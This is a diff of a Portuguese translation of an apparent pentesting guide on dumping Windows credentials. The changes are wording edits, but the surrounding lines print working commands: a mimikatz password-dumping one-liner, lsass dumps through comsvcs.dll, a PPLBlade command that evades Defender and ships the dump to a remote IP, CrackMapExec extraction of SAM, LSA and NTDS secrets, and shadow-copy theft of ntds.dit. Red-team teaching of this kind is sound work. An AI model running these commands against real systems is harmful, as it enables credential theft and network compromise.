@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Encontre outras coisas que o Mimikatz pode fazer em** [**esta página**](credentials-mimikatz.md)**.**
+**Encontre outras coisas que o Mimikatz pode fazer nesta** [**página**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -72,9 +72,9 @@ Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/
 ### Despejando lsass com **comsvcs.dll**
 
 Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **despejar a memória do processo** em caso de falha. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
-É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
+Não é relevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
 Ao analisar esses três componentes, a DLL é acionada para criar o arquivo de despejo e transferir a memória do processo especificado para este arquivo.\
-A utilização de **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar o procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+A utilização de **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 O seguinte comando é empregado para execução:
 ```bash
@@ -104,7 +104,7 @@ Get-Process -Name LSASS
 
 1. Contornar a proteção PPL
 2. Ofuscar arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinatura do Defender
-3. Fazer upload de despejos de memória com métodos de upload RAW e SMB sem gravá-los no disco (despejo sem arquivo)
+3. Fazer upload de despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -114,7 +114,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Extrair segredos LSA
+### Extrair segredos do LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
@@ -123,7 +123,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Extrair o histórico de senhas do NTDS.dit do DC de destino
+### Extrair o histórico de senhas do NTDS.dit do DC alvo
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -131,11 +131,11 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Roubo de SAM & SYSTEM
+## Stealing SAM & SYSTEM
 
-Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque estão protegidos.
+Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque eles estão protegidos.
 
-### Do Registro
+### From Registry
 
 A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
 ```
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Mas você pode fazer o mesmo com **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
+Mas você pode fazer o mesmo com **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e está salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -212,7 +212,7 @@ Disponível desde o Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Você também pode usar o truque de [**cópia de sombra de volume**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia-o do registro ou use o truque de cópia de sombra de volume**](./#stealing-sam-and-system)).
+Você também pode usar o truque de [**cópia de sombra de volume**](#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia-o do registro ou use o truque de cópia de sombra de volume**](#stealing-sam-and-system)).
 
 ### **Extraindo hashes do NTDS.dit**
 
@@ -244,7 +244,7 @@ lazagne.exe all
 ```
 ## Outras ferramentas para extrair credenciais do SAM e LSASS
 
-### Windows Credentials Editor (WCE)
+### Windows credentials Editor (WCE)
 
 Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
